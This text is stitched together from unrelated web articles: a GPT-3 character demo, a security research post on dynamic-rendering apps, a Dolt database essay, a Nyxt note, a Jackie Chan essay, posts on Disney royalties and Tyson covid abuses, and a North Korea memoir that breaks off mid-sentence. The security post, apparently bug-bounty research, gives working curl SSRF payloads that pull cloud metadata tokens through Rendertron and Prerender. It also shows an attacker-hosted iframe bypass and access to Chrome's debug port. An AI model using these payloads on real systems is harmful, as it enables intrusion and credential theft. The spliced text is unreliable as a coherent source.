To demonstrate how far we’ve come toward accomplishing our goal of AI-driven storytelling and emotional intelligence, we created this scene of our character Lucy in conversation with a Guest. GPT-3, OpenAI’s powerful Transformer NLP model that’s been trained on a large corpus of text, is generating almost all of the things said in this video. Essentially, we give the AI some context, and it attempts to complete the text in an intelligent way. It shows how close we are to having natural conversations with an AI that really sees us as individual emotional beings and not task masters by leveraging humans to help guide and train it.</p><p>In an effort to inspire others and move the field forward, let me share some of how we’re doing this on the technology side. Below is a significant subset of the exact context that we gave GPT-3 in the making of this scene. We simply tell it about how we want the conversation to proceed as well as some details about who Lucy and the Guest are so it can generate new dialogue lines with that context.</p><p>CONTEXTS:</p><ul data-rte-list="default"><li><p>The following is a conversation between Lucy and Guest over text messages.</p></li><li><p>In Lucy's world, which is different from the Guest's, the date is 1988, while for the Guest it is still 2020.</p></li><li><p>The Guest reaches out to Lucy over chat message and Lucy responds in a playful way, asking if the Guest is a foozle and comes in peace.</p></li><li><p>Lucy says she can never sleep when the full moon is out, so she's awake now and passing the time by looking out the window for shooting stars.</p></li><li><p>Lucy continues to get to know the guest, asking them lots of personal questions and being imaginative.</p></li><li><p>Lucy eventually asks if the Guest has ever seen a shooting star and what the Guest wished for.</p></li><li><p>Finally, Lucy sees the shooting star, makes her wish, which she keeps as a secret or it won't come true, and then says goodnight.</p></li></ul><p>&nbsp;&nbsp;LUCY:</p><ul data-rte-list="default"><li><p>Little Girl.</p></li><li><p>Active Imagination.</p></li><li><p>Age 8.</p></li><li><p>Lives with Brother, Mom, and Dad.</p></li><li><p>Likes Mysteries, Science, and Drawing.</p></li><li><p>Is looking for a shooting star.</p></li><li><p>Is superstitious and likes horoscopes.</p></li><li><p>Is a daydreamer.</p></li></ul><p>GUEST:</p><ul data-rte-list="default"><li><p>A curious and friendly person who was just introduced to Lucy.</p></li></ul></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1605574654634_5617"><div>

We’ve trained a custom model on many samples of Lucy’s voice so that we can generate ad hoc lines for her, almost instantaneously. That audio is then fed into another model which converts her speech into lip sync and appropriate face animation. We added some tweaks to her head and eye movement, but most of this performance was completely automated without the need for custom animation.</p><p><br>This video is a demonstration of the powerful narratives that can emerge when you combine an artist’s vision, Artificial Intelligence, and emotional intelligence.

<ul>
<li>Dynamic rendering is a technique used to serve prerendered web site pages to crawlers (e.g., Google search engine, Slack or Twitter bots, etc.)</li>
<li>The most popular open source applications for dynamic rendering are Rendertron and Prerender; both of which may introduce vulnerabilities to a network if used improperly.</li>
<li>I used a vulnerability in Rendertron to take over a production web application and earn $5,000 through a bug bounty program.</li>
</ul>
<h2>Introduction</h2>
<p>Modern JavaScript frameworks are heavily utilized for web site development nowadays.
Instead of plain HTML pages, we now have PWAs (progressive web applications) and SPAs (single page applications) that do most of the work in the client's browser and use JavaScript to generate the contents of the page on the fly.</p>
<p>This technology has many advantages and can be effective at creating a sleek UI and UX, but at the same time, it is not <a href="https://en.wikipedia.org/wiki/Search_engine_optimization" target="_blank" rel="noopener">SEO</a> friendly, because crawlers and bots are not developed to render or understand JavaScript. One of the common ways to help bots get valid HTML content is to open a requested page in a headless browser instance on the server, such as <a href="https://pptr.dev/" target="_blank" rel="noopener">Puppeteer</a> or <a href="https://github.com/microsoft/playwright" target="_blank" rel="noopener">Playwright</a>, get the resulting HTML, strip parts that are not intended to be crawled and return it. This approach is called dynamic rendering and is promoted by <a href="https://developers.google.com/search/docs/guides/dynamic-rendering" target="_blank" rel="noopener">Google</a> as one of the possible ways to serve content.</p>

<p>I came across this type of application while doing a security review of packages in the Node.js ecosystem on possible vulnerabilities that may appear when utilizing headless browsers in production. I wrote Semgrep rules and ran them at scale to detect possible vulnerable uses of headless browsers. </p>
<blockquote>
<p>The rules are available in a Semgrep pack here: <a href="https://semgrep.dev/p/headless-browser" target="_blank" rel="noopener">https://semgrep.dev/p/headless-browser</a></p>
</blockquote>
<p>These Semgrep rules produced many results to triage and after investigating them I found out that a significant number of modules that use headless browsers are intended to help webmasters with dynamic rendering.</p>
<p>Due to the growing popularity of this concept, I believe it is important to investigate and understand what can go wrong while using dynamic rendering in production.</p>
<p>The scope of this research includes the two most popular open-source dynamic rendering applications, <a href="https://github.com/GoogleChrome/rendertron" target="_blank" rel="noopener">Rendertron</a> and <a href="https://github.com/prerender/prerender" target="_blank" rel="noopener">Prerender</a>, but the described attacks may be applied to other applications of this type as well. I'll also share how I was able to apply this knowledge to take over a production web server with a few curl requests and earn a $5,000 bug bounty.</p>
<h2>Architecture</h2>
<p>If a web page is generated dynamically on the client but needs to be properly indexed by search engines, a common approach is to catch a request from the crawler or bot, render it server-side, and output the pretty HTML with all the content. That flow generally looks like this:</p>

  </a>
    </span></p>
<ol>
<li>The web server detects crawlers by checking the User-Agent header (or URL query in some cases).</li>
<li>Requests are routed to the rendering application.</li>
<li>The rendering application runs a headless browser and opens the original requested URL, which will render the page as if viewed by a user with a browser.</li>
<li>The resulting HTML is stripped of <code>&lt;script&gt;</code> tags and returned to the web server.</li>
<li>The web server returns the dynamically rendered page to the crawler.</li>
</ol>
<h2>How to identify a dynamic rendering application</h2>
<p>First of all, dynamic rendering is intended to be used with web pages that need to be indexed properly, so they are publicly available by definition. On top of that, prerendering makes sense only if most of the content on the page is generated by JavaScript (usually with a JS framework like React, Angular, Vue, etc.) and created dynamically at the same time. Some examples include: the main page of a news website that updates in real-time or an online store page with a list of the most popular products.</p>
<p>When a candidate site is found, you can identify if dynamic rendering is possible by sending multiple requests to the same page but with different User-Agent headers (remember, dynamic rendering tries to render pages for crawlers):</p>
<div data-language="bash"><pre><code>
<span>curl</span> -v -A <span>"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36"</span> https://shop.polymer-project.org/</code></pre></div>
<div data-language="bash"><pre><code>
<span>curl</span> -v -A <span>"Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)"</span> https://shop.polymer-project.org/</code></pre></div>
<p>If the curl results are different and the response for the fake crawler request has pretty HTML without any <code>&lt;script&gt;</code> tags, it means that the website is using dynamic rendering.</p>
<p>You can test this with <a href="https://shop.polymer-project.org/" target="_blank" rel="noopener">https://shop.polymer-project.org/</a> as an example — it is a demo site for demonstrating dynamic rendering.</p>

<p>If you want to see how each app responds to various User-Agent headers, you can check out the code itself:</p>
<p><a href="https://github.com/prerender/prerender-node/blob/f9c5e12b0e271ded3e3cb6c70b703485280ec9d6/index.js#L37" target="_blank" rel="noopener">https://github.com/prerender/prerender-node/blob/f9c5e12b0e271ded3e3cb6c70b703485280ec9d6/index.js#L37</a></p>
<p><a href="https://github.com/GoogleChrome/rendertron/blob/a1dd3ab1f054bc19e89dcdecdb71dc004f7d068e/middleware/src/middleware.ts#L24" target="_blank" rel="noopener">https://github.com/GoogleChrome/rendertron/blob/a1dd3ab1f054bc19e89dcdecdb71dc004f7d068e/middleware/src/middleware.ts#L24</a></p>
<p>In addition, Rendertron will return the following header: <code>X-Renderer: Rendertron</code>. Prerender has an option for adding an <code>X-Prerender: 1</code> header, but it is not default behavior.</p>
<p>Lastly, both Rendertron and Prerenderer parse specific meta tags in order to change response headers or HTTP status codes. In other words, it gives developers the opportunity to manipulate rendering results by leaving meta tags in the source code of the page. These can also be used to identify a dynamic rendering application.</p>
<p>For Prerender they look like this:</p>
<div data-language="php"><pre><code><span>&lt;</span>meta name<span>=</span><span>"prerender-status-code"</span> content<span>=</span><span>"302"</span> <span>/</span><span>&gt;</span>
<span>&lt;</span>meta name<span>=</span><span>"prerender-header"</span> content<span>=</span><span>"Location: https://www.google.com"</span> <span>/</span><span>&gt;</span></code></pre></div>
<p>For Rendertron:</p>
<div data-language="php"><pre><code><span>&lt;</span>meta name<span>=</span><span>"render:status_code"</span> content<span>=</span><span>"404"</span> <span>/</span><span>&gt;</span></code></pre></div>
<h2>Easy SSRF</h2>
<p>It’s easy to take advantage of a dynamic rendering app when it is publicly available because it allows you to interact with the app directly and send arbitrary requests, including to local endpoints. There are some restrictions for accessing local infrastructure, but depending on the version of the dynamic rendering app, they can be bypassed.</p>
<h3>Rendertron</h3>
<p>Rendertron is quite easy to identify because it has a web frontend that allows you to send requests and take screenshots of the requested page.</p>

    </span></p>
<ul>
<li>Version 3.1.0 has allow-listing option to restrict rendering to a given list of domains or URL patterns (but it needs to be configured:))</li>
<li>Version 3.0.0 blocks any requests to Google Cloud—however, this can bypassed by requesting metadata endpoints inside an iFrame. This restriction does not apply to other cloud providers (AWS, DigitalOcean, etc.) and are still a danger!</li>
<li>Older versions block requests to Google Cloud but allow requests to its beta version <code>http://metadata.google.internal/computeMetadata/v1beta1/</code> (deprecated since September 30)</li>
<li>Version 1.1.1 and older allow all kinds of requests</li>
</ul>
<p>Rendertron’s API (from the docs):</p>
<p><strong>GET /render/:url</strong><br>
The render endpoint will render and serialize your page.</p>
<p><strong>GET /screenshot/:url</strong><br>
<strong>POST /screenshot/:url</strong><br>
The screenshot endpoint takes a screenshot of your page (as an image).</p>
<p>Additional options are available as a JSON string in the POST body. See <a href="https://github.com/GoogleChrome/puppeteer/blob/v1.6.0/docs/api.md#pagescreenshotoptions" target="_blank" rel="noopener">Puppeteer documentation</a> for available options. You cannot specify the type (defaults to jpeg) and encoding (defaults to binary) parameters.</p>
<p>So, when you stumble upon a Rendertron instance, it is worth trying to perform a SSRF attack and exfiltrate cloud tokens like this:</p>
<div data-language="bash"><pre><code><span>curl</span> https://rendertron-instance.here/render/http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token</code></pre></div>
<p>or,</p>
<div data-language="bash"><pre><code><span>curl</span> https://rendertron-instance.here/render/http://169.254.169.254/latest/meta-data/</code></pre></div>
<p>(<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery" target="_blank" rel="noopener">This is a great resource</a> for SSRF payloads.)</p>
<p>If requests are blocked, there is still a chance to force the headless browser to fetch an iFrame and output a screenshot of the metadata endpoint by sending requests to /screenshot and forcing the server to visit a website you control:</p>
<!-- markdown-link-check-disable -->
<div data-language="bash"><pre><code><span>curl</span> https://rendertron-instance.here/render/http://www.attackers-website.here/iframe-example</code></pre></div>
<!-- markdown-link-check-enable -->
<p>The HTML at www.attackers-website.here includes an iFrame with the metadata endpoint. This forces Rendertron to fetch the attacker HTML and render the page on its own server. This means that the iFrame will also be resolved on its own server.</p>
<div data-language="php"><pre><code><span>&lt;</span>html<span>&gt;</span>
  <span>&lt;</span>head<span>&gt;</span>
    <span>&lt;</span>meta content<span>=</span><span>"text/html; charset=utf-8"</span> http<span>-</span>equiv<span>=</span><span>"Content-Type"</span> <span>/</span><span>&gt;</span>
  <span>&lt;</span><span>/</span>head<span>&gt;</span>
  <span>&lt;</span>body<span>&gt;</span>
    <span>&lt;</span>iframe
      src<span>=</span><span>"http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json"</span>
      width<span>=</span><span>"468"</span>
      height<span>=</span><span>"600"</span>
    <span>&gt;</span><span>&lt;</span><span>/</span>iframe<span>&gt;</span>
  <span>&lt;</span><span>/</span>body<span>&gt;</span>
<span>&lt;</span><span>/</span>html<span>&gt;</span></code></pre></div>
<p>This outputs a screenshot of the iFrame containing the cloud instance metadata.

<h3>Prerender</h3>
<p>Prerender does not have a GUI frontend and is not as easy to identify. Worse, requests to / return 400 without any interesting headers:</p>
<div data-language="http"><pre><code><span>HTTP/1.1 <span>400 Bad Request</span></span>
 text/html;charset=UTF-8
 Accept-Encoding
 Mon, 03 Aug 2020 06:55:29 GMT</code></pre></div>
<p>Prerender API</p>
<p><strong>GET /:url</strong><br>
<strong>GET /render?url=:url</strong><br>
<strong>POST /render?url=:url</strong></p>
<p>list of options can be found in the <a href="https://github.com/prerender/prerender#url" target="_blank" rel="noopener">docs</a>, main takeaways:</p>
<ul>
<li>Prerender is also able to a create screenshots</li>
<li><code>followRedirects</code> (false by default) follow 301 redirects if true</li>
</ul>
<p>The only way to identify if an application is using Prerender is to send a request like <code>/render?url=http://www.example.com</code> and check the output. Prerender does not have any built-in protection from cloud data exfiltration but does allow users to configure blacklists and whitelists, so depending on its configuration, chances are that it may be possible to request cloud tokens like</p>
<div data-language="bash"><pre><code><span>curl</span> https://rendertron-instance.here/render?url<span>=</span>http://169.254.169.254/latest/meta-data/</code></pre></div>
<p>On top of that, Prerender connects to headless Chrome through the debug interface, which opens on the hardcoded port 9222.</p>
<p>So if local requests are allowed, it’s possible to figure out the Chrome debug ID</p>
<div data-language="bash"><pre><code><span>curl</span> https://rendertron-instance.here/render?url<span>=</span>http://localhost:9222/json/</code></pre></div>
<p>And then send WebSocket requests to the headless Chrome directly and …</p></div></div></div></section></div>

<p>Using version control to manage your database schema is a very good thing, but it is not a "version controlled database." The goal of this post is to reclaim the term "version control database" for products that actually are databases with version control features. We are not unbiased here. We built <a href="https://doltdb.com/">Dolt</a>, a SQL database with Git-style version control features. We think it will be the category defining product, and we want people to be able to find it.</p>
<h2>Version Controlled Database vs Database Version Control</h2>
<p>To make our case for reclaiming this term, it's worth being precise about the distinction we are trying to draw:

<p>The diagram highlights the nature of the difference between a set of best practices and tools, and a database product:</p>
<ul>
<li>"Database version control" involves using a version control system (VCS) such as Git to version the schema and schema modifications of your database. The database itself knows nothing of its version history. There are many advanced tools and products for this.</li>
<li>A "version controlled database" is a database that stores a full history of its own state, both data and schema.</li>
</ul>
<p>This distinction brings us to the features that define "version controlled databases" as a category: the ability to store a history of its state, along with some version of branching, merging, and diffing across the stored history.</p>
<h2>Why now?</h2>
<p>In a blog entitled <a href="https://medium.com/@karpathy/software-2-0-a64152b37c35">Software 2.0</a>, Andrej Karpathy, a machine learning and artificial intelligence researcher and practitioner, describes a world where computer behavior is increasingly determined by data rather than code. You don't have to be an AI or ML cheerleader to recognize the increasing importance of data in determining the behavior of production systems. Ultimately, the value of data is increasing. Separately, storage costs of data have been in long run secular decline. These two factors combined with the advent of <a href="https://en.wikipedia.org/wiki/Merkle_tree">Merkle tree</a> make it tractable to expose a full data history to a query interface, and therefore to build true version controlled databases.</p>
<h2>Why adopt</h2>
<p>We identified the fundamental features of a version controlled database as both the ability to store a history of the database state, as well as version control primitives such as branching, merging, and diffing.</p>
<h3>Branching and Merging</h3>
<p>Branching and merging are fundamental primitives for collaboration. They allow users to work concurrently against the same base dataset, and then resolve their differences in a principled and robust way. These capabilities differentiate version control databases from existing solutions by enabling users to collaborate on datasets without application layer code. The existing paradigm for databases imagines a single concept of state, and any tools that permit versioning and reconciliation need to be built into the application layer.</p>
<h3>Diffing</h3>
<p>Robust computation of "diffs" is not just useful for review, it is what enables version control systems to effectively implement operations like <code>clone</code> and <code>pull</code>. By implementing efficient diffs across their history, version control databases make for excellent data distribution formats. Users can <code>clone</code> and <code>pull</code> datasets, instantly querying strongly typed data using the database's query interface. The concept of "loading" data becomes redundant, and a whole class of errors defined by data type corruption is eliminated. It shouldn't be necessary to figure out what strings a data vendor uses to signify <code>NULL</code>, it should be native to the distribution format.</p>
<p>These features combine to provide much needed capabilities to data science and data engineering teams, and whoever else might have use for them. In particular</p>
<ul>
<li>collaboration becomes a first class consideration, with the ability for potentially hundreds of users to edit a dataset concurrently and robustly combine the results</li>
<li>experiments and their results become completely reproducible by associating runs with a commit hash of the input data and result set</li>
<li>distribution is transformed from a headache of parsing and loading various data formats which do not provide type guarantees to simply executing <code>clone</code> and <code>pull</code> operations</li>
</ul>
<p>In summary, we believe that version control databases can enable teams with powerful capabilities that they would otherwise have to invest considerable engineering resources in building and maintaining on top of existing database solutions.</p>
<h2>Examples of Version Controlled Databases</h2>
<p>If you've gotten to this point, it's likely that you are at least curious about what the landscape of products in this category of databases looks like. Naturally there are options other than Dolt, and for some use-cases those options might be the best fit.</p>
<h3>TerminusDB</h3>
<p><a href="https://github.com/terminusdb">TerminusDB</a> is a graph database, which means that data is described and queried in terms of graph data structures. It implements its own query language. TerminusDB is inspired by Git, and supports branching, merging and diffing in a Git-like interface.</p>
<h3>Noms</h3>
<p>Dolt is built on top of <a href="https://github.com/attic-labs/noms">Noms</a>. Noms is a Git-like distributed database that provides storage for structured objects defined by Go structs. Noms provides versioning and synchronization primitives for both the object definitions themselves, and values those objects take on. Users interact with Noms via Go code.</p>
<h3>Irmin</h3>
<p><a href="https://github.com/mirage/irmin">Irmin</a> is a storage layer agnostic database inspired by Git, and written in O'Caml. Users define objects in O'Caml that can then be stored using Git-like semantics. It is quite similar in spirit to Noms, but instead of Go structs, users describe, create, and update their data in O'Caml code.</p>
<h3>Dolt</h3>
<p><a href="https://github.com/dolthub/dolt">Dolt</a> is our entry into this novel category of database. Dolt is a SQL database that implements the MySQL standard. Dolt leans heavily on Git, and implements branching, merging, and diff operations, and other Git primitives where relevant.</p>
<h2>Why Dolt</h2>
<p>The choice to implement the MySQL standard as a query interface strongly differentiates Dolt. Other version controlled databases, while interesting, require users to adopt a query interface that suits the database. Dolt takes the opposite position. We believe that SQL is the language of choice for the vast majority of our potential users, and we made the decision to adopt a query interface that suits our users.</p>
<p>As consequence of choosing the MySQL standard is compatibility with a huge ecosystem of tools that connect to Dolt out of the box. A quick look at our <a href="https://www.dolthub.com/docs/integrations/programmatic-clients/">docs</a> shows nine programming languages with tested MySQL connectors that work with Dolt. For folks that know SQL, and one of those nine programming languages, getting started with Dolt should be straight forward.</p>
<p>This design decision does not come without costs. The underlying commit graph storage is not a natural fit for a SQL query engine, and implementing a super set of MySQL on top of that storage layer is a huge technical commitment. Not only are we committed to matching everything MySQL can do, but we also have to design a set of functions to expose the commit graph in our SQL engine.</p>
<h2>Conclusion</h2>
<p>The software industry has long considered version control something that is <em>done to</em> databases, not a <em>feature of</em> databases. At DoltHub we consider "version controlled database" to be a product category, and Dolt is our attempt at a product that fits in that category.</p>
<p>Version control databases are not competitive with the <em>practice</em> of version controlling your database schema, or products that implement that practice. Instead they are a relatively novel category of databases differentiated by features that cater to users who care about capabilities that support collaboration, versioning, reproducibility, and distribution. By making these capabilities native to Dolt we hope to enable users to elevate the quality of their data infrastructure without the need to write and maintain application code, as well as open up possibilities that simply did not exist before.</p>

<p>We are excited to introduce the new built-in Nyxt dashboard! (this feature will be available in the next release of Nyxt).</p>
<p><img src="https://nyxt.atlas.engineer/static/image/article/dashboard.png"></p>
<p>The dashboard in Nyxt can be configured to show any available system information, processes running, disk space available, the weather, etc. If the information is available, the dashboard can display it.</p>

<p>Use the following snippet within your configuration file to enable the built-in dashboard:</p>

<p>If you wish to specify a different dashboard function (for example, a function of your own making), pass a different function to <code>make-startup-function</code>.</p>
<p>In creating a new dashboard function, you'll be able to produce any layout/information you wish- that is how you can completely customize the dashboard.</p>

<p>The built-in dashboard uses an internal buffer. Therefore, to change its appearance, you can change the <code>style</code> of the <code>internal-buffer</code> class. Changing this will effect all of your interal buffers (examples include: bookmark listing, buffer listing, message listing, help pages, etc)- resulting in an easily configurable, consistent style.</p>
<p>In doing so you can make Nyxt look exactly how you want!</p>

<p>Thanks for reading :-)</p>

<blockquote>
<p>Whatever you do, do the best you can, because the film live forever. “No, because, you know, that day raining and the actor don’t have time”. I said “Would you go to every theater to tell the audience?” No! The audience sit in the theater – “good movie”, “bad movie”. That’s all.</p>
</blockquote>
<p>I try to follow it with everything I do. With professional work – the software I create, the screenplays I write and the films I produce. With my personal life – how I talk to people, the things I buy and the cleanliness of my house.</p>
<p>To function, it must be implemented at every level. To do the best we can in software work, we must do the best we can with every line of code, email to a client and commit message. We will not clean our house the best we can unless we take care to pull out a toothbrush when needed, and even research the right toothbrush to have in our cleaning kit (don’t worry, any will do).</p>
<p>I can hear you already, “it’s too mentally tasking to do”. That line of thought is exactly what Jackie Chan advises us against. Even when the reservation is true, even when it’s raining and the actor doesn’t have time, we should ask ourselves “how can this be done despite the trouble”. Same thing goes for the advice itself. Instead of dismissing it on the account of mental load, one should ask “How can I apply this in my life anyway?”</p>
<p>Do no conflate “the best you can” with “perfect”. They are different things. “The best you can” refers to achieving goals. Goals usually combine all considerations, rather than the focus on an isolated metric of quality. The goal to have good breakfast will not be achieved the best you can if you eternally postpone it trying to perfect a french omelette.</p>
<p>Not any goal will do. Goals must adhere to high standards. That is why it can take Jackie Chan a year to film a movie. He takes the time needed to do the best he can, and still, he says, can see the imperfections when watching his own work. We should balance.</p>
<p>Yet it is true. Even though it’s somewhat of an “obvious” insight, it is very hard to put into practice. Around every corner hides a legitimate reason to do less.</p>
<p>We must remember that having reasons does not turn a failure to success. End results are completely unaffected by rationalization as to why they should or shouldn’t be the way they are.</p>
<p>An end result is just is.</p>

<p>Alan Dean Foster is an sf legend – a writer who produced a shelf of original novels but also made a reputation novelizing movies and TV from Star Wars to Aliens, turning out books that transcended quickie adaptations, becoming beloved bestsellers in their own right.</p>
<p>Disney now owns a bunch of these books, thanks to their acquisitions of Lucas and Fox, and these books continue to sell briskly. Disney not only isn't paying Foster any royalties for these books – they're refusing to even issue him royalty statements.</p>
<p><a href="https://www.sfwa.org/2020/11/18/disney-must-pay/">https://www.sfwa.org/2020/11/18/disney-must-pay/</a></p>
<p>Disney has blackholed Foster's agents and lawyers, and also the Science Fiction Writers of America (SFWA); to the extent that they have communicated with him, they have espoused a radical (jaw dropping) copyright theory.</p>
<p>This is Disney's theory: When they bought Lucas and Fox, they acquired the copyright licenses that enabled them to sell the Foster's books – but not the liability, the legal obligation to pay him for his books.</p>
<p>As SFWA president Mary Robinette Kowal says, this theory could absolutely upend the nature of copyright itself. Any publisher that wanted to go on making money from an author without paying them could simply sell the rights to a sister company, which then denies any obligations.</p>
<p>Foster brought his case to SFWA's grievance committee – a group that has worked on my behalf in the past, extracting a fee from a multinational publisher that commissioned and accepted a story from me but then offered an odious and unacceptable contract they refused to amend.</p>
<p>Usually griefcom work happens in the background: a SFWA member goes to griefcom, griefcom goes to the publisher, the publisher settles. This is the first time in more than a decade that SFWA has gone public with a complaint.</p>
<p>To be fair, Disney <em>did</em> offer to meet with Foster, but demanded that he sign an NDA <em>prior</em> to any negotiation. This is Not Normal. Sometimes the OUTCOME of a negotiation is confidential, but you don't go into a negotiation under NDA.</p>
<p>Disney appears to be taking a page from the cartoonish villain Scooter Braun, who refused to meet with Taylor Swift about buying back the rights to her masters without an NDA.</p>
<p><a href="https://twitter.com/taylorswift13/status/1328471874318311425">https://twitter.com/taylorswift13/status/1328471874318311425</a></p>
<p>Foster's case is a gross injustice. He has cancer and his wife is ill. He wrote these books, Disney bought them. They're making money from them. They owe him money. Period.</p>
<p>But beyond the individual injustice being visited upon Foster, Kowal and SFWA worry that this represents a suite of new, corporate anti-writer tactics: flipping assets without liabilities, refusing to talk about it without an NDA.</p>
<p>You can follow Foster's case with the #DisneyMustPay hashtag. If you're a writer facing similar tactics (even if you're not a SFWA member), they're seeking your story, via this form:</p>

<p>Remember last April, when US meatpacking giants like Tyson were the epicenter of runaway superspreader events that slaughtered the poor, precarious, racialized workers who toiled under brutal and unsafe conditions?</p>
<p>One of the hardest-hit was Tyson's Waterloo, IA plant (the largest meat packing plant in America), where workers were denied PPE, forced to work without social distancing, and where more than 1,000 of them contracted covid. Many died.</p>
<p>One of the dead is Isidro Fernandez. In a wrongful death suit, his lawyers revealed details of Tyson's abuse of its workers that shock the conscience, like the fact that manager Tom Hart ran a betting pool on how many workers would contract covid.</p>
<p><a href="https://iowacapitaldispatch.com/2020/11/18/lawsuit-tyson-managers-bet-money-on-how-many-workers-would-contract-covid-19/">https://iowacapitaldispatch.com/2020/11/18/lawsuit-tyson-managers-bet-money-on-how-many-workers-would-contract-covid-19/</a></p>
<p>The suit also claims senior manager John Casey told supervisors that they were required to report for work even if they had symptoms, calling covid a "glorified flu." He forced a supervisor to cancel a testing appointment, saying "We all have symptoms – you have a job to do."</p>
<p>A worker who was so sick he vomited on the line was ordered back to work the next day.</p>
<p>As conditions in the plant deteriorated, Tyson managers stopped visiting the floor altogether in a bid to protect themselves. Instead, they delegated to inexperienced supervisors.</p>
<p>They also told workers they would only be eligible for a $500 "thank you bonus" if they reported for every shift they were scheduled to work, regardless of whether they were sick and contagious.</p>
<p>All of this was justified – by Tyson and its enablers in the GOP – as a necessary, regrettable part of keeping America fed during the lockdown. But Tyson's breakneck meat-packing wasn't primarily domestic: they were serving the Chinese market.</p>
<p>Chinese meat-packers had largely been mothballed to spare workers from the virus; as a result, the company was able to increase its exports to China by 600% during Q1-2020.</p>
<p>But this isn't the story that Tyson's execs told Governor Kim Reynolds when they lobbied for exemptions from liability for the employees they maimed and murdered during the same period – they claimed it was all patriotic zeal to feed America.</p>
<p>The case has moved to federal court, thanks to Trump's invocation of the Defense Production Act, which ordered Tyson to stay open during the lockdown.</p>

He said he had full details of the shoot down supplied by eyewitness United States Air Force (USAF) pilots and map coordinates of the site of the crash (which he sent to me) and wished to visit the area to discover the fate of his brother.</p><p>The background was that the pilot, Flt Lt Desmond Hinton, who received the Distinguished Flying Cross in World War II for shooting down two Japanese fighters had bailed out of his burning F84e Thunderjet whilst carrying out a strafing mission north east of Pyongyang on 2 January 1952. At the time, Flt Lt Hinton was one of a number of RAF pilots who were attached to and flying with the USAF. Despite enquiries after the war and with no further information as to his fate forthcoming, Flt Lt Hinton was subsequently officially listed as missing in action.</p><p>This seemed a daunting request, but nevertheless I submitted it to the North Koreans and having gone through the usual long and tortuous channels I was surprised to receive an invitation to a meeting with senior North Korean military officers to discuss the request. Soon after therefore, it was with some degree of trepidation that I and my interpreter set off to meet these senior officers at a large military base on the outskirts of Pyongyang.</p><p>Driving into the base, we stopped at the entrance guard house and I was told to leave my diplomatic vehicle parked there. Then my interpreter and I climbed into a small military vehicle with an officer who my interpreter told me would be our liaison officer for the visit.</p><p>The base was huge. We drove past ranks of tanks, armoured vehicles and lorries which appeared to be in pristine (and highly polished) condition. I did learn later that this base was one of several in the Pyongyang garrison that supplied vehicles for the massed televised parades.</p><p>A short while later we pulled up outside a large office building. Our liaison officer led us in and up the stairs to a large conference room where sat several high ranking officers. There were also some junior officers milling around as well as a couple of shady looking civilians who never took their eyes off me for the whole meeting. Very disconcerting.</p><div id="gallery-3"><figure><p><a href="https://www.mydiplomaticlife.com/british-diplomat-works-with-north-korean-military/dscn0156/#main"><img width="510" height="383" src="https://i1.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/DSCN0156.jpg?fit=510%2C383&amp;ssl=1&amp;is-pending-load=1" alt="My Diplomatic Life" aria-describedby="gallery-3-1253" data-lazy-srcset="https://i1.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/DSCN0156.jpg?w=510&amp;ssl=1 510w, https://i1.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/DSCN0156.jpg?resize=300%2C225&amp;ssl=1 300w" data-lazy-sizes="(max-width: 510px) 100vw, 510px" data-lazy-src="https://i1.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/DSCN0156.jpg?fit=510%2C383&amp;ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></a></p><figcaption id="gallery-3-1253"> Social Meeting with North Korean Colonel</figcaption></figure></div><p>Some commands were rapped out in Korean and everyone sat down. I then outlined my request to them and also provided them with all the relevant information that had been sent to me from the UK. They listened politely. They were very courteous and the atmosphere was more relaxed than I had anticipated. When I had finished my spiel and before they responded to my request, tea was brought in and they all lit up cigarettes. As I drank my tea, they all began a long conversation amongst themselves.</p><p>Finally, they said they would investigate this case and get back in touch. So thinking that this was an end to the proceedings, I stood up preparing to leave, but surprisingly no, it was not quite the end. They invited me to have lunch with them, which took me completely off guard.</p><p>Before I could respond, another command was rapped out and a series of orderlies wheeled in trollies containing a cold buffet and drink. The buffet was well prepared but the only downside was at the end of the meeting there were several toasts which meant imbibing several shots of the lethal North Korean Soju the after effects of which I did in due course suffer!</p><p>So the meeting finally came to an end. I thought that after this first meeting, that would be the end of it. I would get the usual reply back saying this request was not possible to facilitate. The Korean War was something that the North Koreans revered. Museums full of captured allied equipment, films, memorials, statues and posters depicting their glorious victory abounded everywhere. So requesting assistance in finding a hated enemy, albeit a fallen one, was perhaps a request too far.</p><div id="gallery-4"><figure><p><a href="https://www.mydiplomaticlife.com/british-diplomat-works-with-north-korean-military/dscn0169-1/#main"><img width="510" height="383" src="https://i2.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/DSCN0169-1.jpg?fit=510%2C383&amp;ssl=1&amp;is-pending-load=1" alt="North Korea" aria-describedby="gallery-4-1254" data-lazy-srcset="https://i2.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/DSCN0169-1.jpg?w=510&amp;ssl=1 510w, https://i2.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/DSCN0169-1.jpg?resize=300%2C225&amp;ssl=1 300w" data-lazy-sizes="(max-width: 510px) 100vw, 510px" data-lazy-src="https://i2.wp.com/www.mydiplomaticlife.com/wp-content/uploads/2020/07/DSCN0169-1.jpg?fit=510%2C383&amp;ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></a></p><figcaption id="gallery-4-1254"> North Korea</figcaption></figure></div><p>But surprisingly, no.</p><p>Against all expectations, they did get back to me shortly afterwards with some quite startling news. Based on the information I had given them, they had identified the crash site which was close to a village called Kuso-ri/Gueso-ri situated near to what is currently the main airport for Pyongyang.</p><p>They had spoken with villagers including two elders who had witnessed the shoot down. Flt Lt Hinton had indeed ejected but his parachute failed and he was killed on impact. The villagers had then interred him in an unmarked grave in a field adjacent to the village. This spot had been identified and human bones and fragments of uniform and aircraft were also uncovered. This scenario is somewhat similar to 